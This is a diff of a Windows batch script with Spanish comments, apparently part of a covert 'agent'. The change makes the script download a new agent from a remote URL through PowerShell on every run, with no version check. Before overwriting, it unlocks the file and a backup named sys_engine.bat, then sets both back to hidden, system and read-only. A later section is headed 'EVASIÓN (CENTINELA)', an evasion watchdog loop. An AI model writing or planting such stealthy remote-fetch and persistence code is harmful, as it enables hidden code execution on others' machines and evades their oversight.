@@ -43,36 +43,23 @@ if "!LINEA_LOCAL!" LEQ "!LINEA_NUBE!" (
 )
 ::
 ::
+:: Si la nube tiene una versión superior, descargamos el nuevo Agente
 
-
-
-
-if exist "%VERSION_DIR%\v_data.log" (
-    set /p VERSION_NUBE= < "%VERSION_DIR%\v_data.log"
-    
-    :: LIMPIEZA DE FORMATO: Quitamos espacios vacíos que GitHub a veces añade
-    set "VERSION_NUBE=!VERSION_NUBE: =!"
-    
-
-    
-    :: Si la nube tiene una versión superior, descargamos el nuevo Agente
-    if !VERSION_NUBE! GTR %VERSION_LOCAL% (
+:: 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
+attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
+attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
-        :: 2.1 DESBLOQUEO TÁCTICO ANTES DE SOBREESCRIBIR
-        attrib -h -s -r "%AGENTE_FILE%" >nul 2>&1
-        attrib -h -s -r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
+:: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
+:: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
+copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
         
-        :: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
-        :: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
-        powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
-        copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
-        
-        :: 2.3 RE-ACTIVACIÓN DE ESCUDOS
-        attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
-        attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
-    )
-    copy 
-)
+:: 2.3 RE-ACTIVACIÓN DE ESCUDOS
+attrib +h +s +r "%AGENTE_FILE%" >nul 2>&1
+attrib +h +s +r "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
+    
+ 
+
 
 :BUCLE_VIGILANCIA
 :: --- 3. EVASIÓN (CENTINELA) ---
